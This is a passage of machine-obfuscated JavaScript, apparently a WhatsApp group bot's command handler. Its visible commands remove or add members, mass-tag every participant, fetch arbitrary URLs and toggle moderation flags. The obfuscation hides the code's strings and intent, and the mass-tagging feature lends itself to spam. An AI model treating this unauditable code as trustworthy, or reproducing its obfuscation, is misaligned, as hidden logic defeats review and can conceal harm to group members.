                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x947)](_0x1ac933, _0x2a5309[_0x5d4417(0x1004)]));
            }
            break;
        case _0x2a5309[_0x5d4417(0x7f5)]:
        case _0x2a5309[_0x5d4417(0xb52)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x1013)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                    return _0x2a5309[_0x5d4417(0x947)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                if (!_0xedb653[_0x5d4417(0xd6d)])
                    return _0x2a5309[_0x5d4417(0x302)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                if (_0x156b97 || _0xedb653[_0x5d4417(0x7eb)]) {
                    const _0x4a6175 = _0xedb653[_0x5d4417(0x10f9) + 'id'][-0x57 * 0xc + 0x60 * 0x49 + -0x174c] ? _0xedb653[_0x5d4417(0x10f9) + 'id'][0x1eab + 0x647 * -0x1 + -0xdf * 0x1c] : _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0xeee)] : _0x156b97 ? _0x2a5309[_0x5d4417(0x52d)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]) : ![];
                    var _0x23f1d1 = await _0x57ed02[_0x5d4417(0x5d3)](_0x4a6175[_0x5d4417(0xc6c)]('@')[-0xb * -0x335 + -0xb5 * -0x1f + 0x1c99 * -0x2]);
                    if (_0x2a5309[_0x5d4417(0x385)](_0x23f1d1[_0x5d4417(0xf65)], -0x1182 + -0x1f5d + 0x2e0 * 0x11))
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc16)]);
                    const _0x2fbaaa = await _0x57ed02[_0x5d4417(0x21d) + _0x5d4417(0x9ec) + _0x5d4417(0x10f4)](_0xedb653[_0x5d4417(0x9e2)], [_0x4a6175], _0x2a5309[_0x5d4417(0x6ea)]);
                    await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0x634) + 'n\x20' + _0x4a6175[_0x5d4417(0xc6c)]('@')[-0x5 * 0x225 + 0xfc8 + -0xb9 * 0x7] + (_0x5d4417(0x1007) + _0x5d4417(0x7aa)));
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe26)](_0x1ac933, _0x2a5309[_0x5d4417(0x248)]));
            }
            break;
        case _0x2a5309[_0x5d4417(0x9f2)]: {
                const _0x4ccca5 = _0x2a5309[_0x5d4417(0x8c9)][_0x5d4417(0xc6c)]('|');
                let _0x9dc77e = 0x7f5 + 0x2 * -0xe0c + 0x1423;
                while (!![]) {
                    switch (_0x4ccca5[_0x9dc77e++]) {
                    case '0':
                        await _0x2a5309[_0x5d4417(0xd9c)](sleep, 0x3 * 0xadf + -0x1 * -0x12eb + -0x17f * 0x18);
                        continue;
                    case '1':
                        if (!_0xedb653[_0x5d4417(0xe3e)])
                            return _0x2a5309[_0x5d4417(0x924)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                        continue;
                    case '2':
                        if (!_0x47f98c)
                            return _0x2a5309[_0x5d4417(0x511)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                        continue;
                    case '3':
                        await _0x57ed02[_0x5d4417(0xb93)](_0xedb653[_0x5d4417(0x9e2)]);
                        continue;
                    case '4':
                        await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xadf)]);
                        continue;
                    }
                    break;
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x11e7)]: {
                const _0x1c2c7c = _0x2a5309[_0x5d4417(0xa63)][_0x5d4417(0xc6c)]('|');
                let _0x5260ac = 0x1b9a + -0x41c + -0x177e;
                while (!![]) {
                    switch (_0x1c2c7c[_0x5260ac++]) {
                    case '0':
                        if (!_0xedb653[_0x5d4417(0xe3e)])
                            return _0x2a5309[_0x5d4417(0xff9)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                        continue;
                    case '1':
                        if (!_0x47f98c)
                            return _0x2a5309[_0x5d4417(0x7c2)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                        continue;
                    case '2':
                        await _0x57ed02[_0x5d4417(0xb3b) + _0x5d4417(0x301)](_0xedb653[_0x5d4417(0x9e2)]);
                        continue;
                    case '3':
                        _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd2f)]);
                        continue;
                    case '4':
                        if (!_0xedb653[_0x5d4417(0xd6d)])
                            return _0x2a5309[_0x5d4417(0x5ad)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                        continue;
                    }
                    break;
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xddf)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x643)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                    return _0x2a5309[_0x5d4417(0x11b6)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1fb)](_0x1ac933, _0x2a5309[_0x5d4417(0xe7e)]));
                let _0x33ca19 = _0x2a5309[_0x5d4417(0x3e6)](_0x156b97, '\x0a\x0a'), _0x1191ab = await _0xedb653[_0x5d4417(0x2e8)][_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0x462)](_0x4f3534 => _0x4f3534['id'])[_0x5d4417(0xde7)](_0x4df86d => _0x4df86d !== _0x4815f3 && _0x4df86d !== _0xedb653[_0x5d4417(0xeee)]);
                await _0x1191ab[_0x5d4417(0x102c)](_0xd72e78 => {
                    const _0x26579e = _0x5d4417;
                    _0x33ca19 += '@' + _0xd72e78[_0x26579e(0xc6c)]('@')[0x121c + 0x66f + -0x188b] + '\x0a';
                }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x33ca19,
                    'mentions': [..._0x1191ab]
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x546)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0xe98)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0xedb653[_0x5d4417(0xd6d)])
                    return _0x2a5309[_0x5d4417(0xdde)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                const _0x4f35b3 = _0x2a5309[_0x5d4417(0x65e)](_0x2a5309[_0x5d4417(0x7b0)], await _0x57ed02[_0x5d4417(0xcec) + _0x5d4417(0x6aa)](_0xedb653[_0x5d4417(0x9e2)]));
                var _0x4417bc = '\x0a' + _0x4f35b3 + '\x0a';
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x4417bc,
                    'matchedText': '' + _0x4f35b3
                }, { 'quoted': _0xedb653 });
            }
            break;
        case 'ht':
        case _0x2a5309[_0x5d4417(0xb0b)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0xe9b)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                    return _0x2a5309[_0x5d4417(0x4b4)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x442)](_0x1ac933, _0x2a5309[_0x5d4417(0xe7e)]));
                let _0x326e1f = _0xedb653[_0x5d4417(0x2e8)][_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0x462)](_0x1fc119 => _0x1fc119['id']);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x156b97,
                    'mentions': [..._0x326e1f]
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0xd03)]:
        case _0x2a5309[_0x5d4417(0x4a5)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x5ab)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3d5)](_0x1ac933, _0x2a5309[_0x5d4417(0x1192)]));
                if (!_0x156b97[_0x5d4417(0x3d3)](_0x2a5309[_0x5d4417(0x675)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                let _0x2ffd92 = _0x156b97[_0x5d4417(0xc6c)](_0x2a5309[_0x5d4417(0x7b0)])[0x166 * 0x11 + 0x241 * 0xd + -0x3512], _0xe6d3fb = await _0x57ed02[_0x5d4417(0x52b) + _0x5d4417(0x6ab)](_0x2ffd92);
                _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x63a) + _0x5d4417(0xfda) + _0x5d4417(0x4c3) + _0x5d4417(0x23a) + _0xe6d3fb);
            }
            break;
        case _0x2a5309[_0x5d4417(0x10ed)]:
        case 'g': {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x9b6)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x442)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                let _0x162ecd = await _0x2a5309[_0x5d4417(0x9b9)](fetchJson, _0x156b97);
                _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x162ecd, null, -0x3d5 * 0x3 + -0xc33 + -0x25 * -0xa4));
            }
            break;
        case _0x2a5309[_0x5d4417(0x6b2)]:
        case _0x2a5309[_0x5d4417(0x468)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe26)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97 && !_0xedb653[_0x5d4417(0x7eb)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xfba)](_0x1ac933, _0x2a5309[_0x5d4417(0x67d)]));
                if (!_0x156b97[_0x5d4417(0x3d3)](_0x2a5309[_0x5d4417(0x7f6)]) && !_0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x22d)][_0x5d4417(0x3d3)](_0x2a5309[_0x5d4417(0x7f6)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                let _0xabfcaa = _0xedb653[_0x5d4417(0x7eb)] ? _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x22d)][_0x5d4417(0xc6c)](_0x2a5309[_0x5d4417(0x7f6)])[-0x1780 + -0x23fb + -0x4 * -0xedf] : _0x156b97[_0x5d4417(0xc6c)](_0x2a5309[_0x5d4417(0x7f6)])[0x497 * -0x4 + 0x11 * 0x131 + 0x2 * -0xf2], _0x31f9bd = await _0x57ed02[_0x5d4417(0xe07) + _0x5d4417(0x66e)](_0x2a5309[_0x5d4417(0xfd1)], _0xabfcaa);
                await _0x57ed02[_0x5d4417(0xe07) + _0x5d4417(0x10df)](_0x31f9bd['id']), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x1093) + _0x5d4417(0xa5e) + _0x5d4417(0xcf0) + _0x5d4417(0xd30) + _0x5d4417(0x768) + _0x5d4417(0x34d) + _0x31f9bd[_0x5d4417(0x277)] + (_0x5d4417(0x1042) + _0x5d4417(0xe88) + '\x20*') + _0x2a5309[_0x5d4417(0xfa6)](_0x31f9bd[_0x5d4417(0xaaa) + 's'], 0x8 * 0x2 + -0x1894 + -0x1 * -0x1885) + '*\x0a');
            }
            break;
        case _0x2a5309[_0x5d4417(0x77a)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xcca)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x643)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x476d23 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0xe7c)](_0x476d23, 'on')) {
                    if (_0x2a5309[_0x5d4417(0xc00)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x1089)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x975) + _0x5d4417(0xa4a) + _0x5d4417(0x8d8));
                    return global['db'][_0x5d4417(0x576)][_0x5d4417(0x1089)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x708)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0xd08)](_0x476d23, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x5fc)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x1089)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x975) + _0x5d4417(0x1a7) + _0x5d4417(0x8d8));
                        return global['db'][_0x5d4417(0x576)][_0x5d4417(0x1089)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x938)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb72)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x443)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xfbb)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ac)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x5f3d5e = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x10a0)](_0x5f3d5e, 'on')) {
                    if (_0x2a5309[_0x5d4417(0xe7c)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x3b5) + 'i'], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x113b) + _0x5d4417(0x9b5) + _0x5d4417(0x4c4));
                    return global['db'][_0x5d4417(0x576)][_0x5d4417(0x3b5) + 'i'] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc44)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0xa0d)](_0x5f3d5e, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0xc42)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x3b5) + 'i'], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x113b) + _0x5d4417(0x5a4) + _0x5d4417(0x4c4));
                        return global['db'][_0x5d4417(0x576)][_0x5d4417(0x3b5) + 'i'] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf22)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ca)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x256)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xe4a)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1fb)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x4687a8 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x542)](_0x4687a8, 'on')) {
                    if (_0x2a5309[_0x5d4417(0x929)](global['db'][_0x5d4417(0x576)][_0x5d4417(0xd92)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x7fb) + _0x5d4417(0x869) + _0x5d4417(0x762));
                    return global['db'][_0x5d4417(0x576)][_0x5d4417(0xd92)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x584)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0xc00)](_0x4687a8, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x3aa)](global['db'][_0x5d4417(0x576)][_0x5d4417(0xd92)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x7fb) + _0x5d4417(0xa07) + _0x5d4417(0x762));
                        return global['db'][_0x5d4417(0x576)][_0x5d4417(0xd92)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x9ad)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x442)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x80b)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xd5f)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x6e4)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x5bf68b = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x8d4)](_0x5bf68b, 'on')) {
                    if (_0x2a5309[_0x5d4417(0x10aa)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x792)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xfa4) + _0x5d4417(0xbfb) + _0x5d4417(0x762));
                    return global['db'][_0x5d4417(0x576)][_0x5d4417(0x792)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd0d)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0x111b)](_0x5bf68b, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x929)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x792)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xfa4) + _0x5d4417(0x5b2) + _0x5d4417(0x762));
                        return global['db'][_0x5d4417(0x576)][_0x5d4417(0x792)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x699)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x30d)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xe84)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x442)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x503)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe26)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x12a422 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x10aa)](_0x12a422, 'on')) {
                    if (_0x2a5309[_0x5d4417(0x105c)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xabd)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x477) + _0x5d4417(0xe46) + _0x5d4417(0xa30) + _0x5d4417(0x81a));
                    return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xabd)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xe9c)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0xa0d)](_0x12a422, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x1010)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xabd)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x477) + _0x5d4417(0xe46) + _0x5d4417(0x362) + _0x5d4417(0x81a));
                        return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xabd)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb98)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x86c)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x22b)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0xd51)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xcd9)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xcd9)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0xda99ff = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0xd93)](_0xda99ff, 'on')) {
                    if (_0x2a5309[_0x5d4417(0x43b)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x611) + _0x5d4417(0x10ff) + _0x5d4417(0x8c3) + _0x5d4417(0x762));
                    if (_0x2a5309[_0x5d4417(0xb58)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)], !![]))
                        global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)] = ![];
                    return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa0b)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0x1116)](_0xda99ff, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x929)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x611) + _0x5d4417(0x10ff) + _0x5d4417(0xde9) + _0x5d4417(0x762));
                        return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf04)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x102b)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x795)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x303)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x874)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x947)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x729be0 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x5fc)](_0x729be0, 'on')) {
                    if (_0x2a5309[_0x5d4417(0x1022)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd91) + _0x5d4417(0x4d6) + _0x5d4417(0x416) + _0x5d4417(0x4c4));
                    if (_0x2a5309[_0x5d4417(0xd08)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)], !![]))
                        global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)] = ![];
                    return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x4e8)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0xd93)](_0x729be0, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0xc42)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd91) + _0x5d4417(0x4d6) + _0x5d4417(0xc1d) + _0x5d4417(0x4c4));
                        return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3eb)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd9c)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x946)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x30d)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x3e4)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x4b4)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x439de4 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x43b)](_0x439de4, 'on')) {
                    if (_0x2a5309[_0x5d4417(0xed3)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x8b5)], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xfc0) + _0x5d4417(0x747) + _0x5d4417(0x488) + '!');
                    return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x8b5)] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x2ec)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0xb02)](_0x439de4, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x43b)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x8b5)], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xfc0) + _0x5d4417(0x2ed) + _0x5d4417(0x773) + '!');
                        return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x8b5)] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x115d)]);
                    } else
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x848)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x603)]:
        case _0x2a5309[_0x5d4417(0xb29)]:
        case _0x2a5309[_0x5d4417(0x11b0)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x42c)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x1127)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xddd)](_0x1ac933, _0x2a5309[_0x5d4417(0x3f7)]));
                let _0x1f3e25 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0x929)](_0x1f3e25, 'on')) {
                    if (_0x2a5309[_0x5d4417(0x1d9)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xd0f) + 'pm'], !![]))
                        return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x7b3) + _0x5d4417(0x257) + _0x5d4417(0x3e5) + _0x5d4417(0x3ba));
                    return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xd0f) + 'pm'] = !![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xa37)]);
                } else {
                    if (_0x2a5309[_0x5d4417(0x10aa)](_0x1f3e25, _0x2a5309[_0x5d4417(0x5e4)])) {
                        if (_0x2a5309[_0x5d4417(0x3b0)](global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xd0f) + 'pm'], ![]))
                            return _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x7b3) + _0x5d4417(0x257) + _0x5d4417(0xd3e) + _0x5d4417(0x109c));
                        return global['db'][_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xd0f) + 'pm'] = ![], _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc7e)]);
                    } else
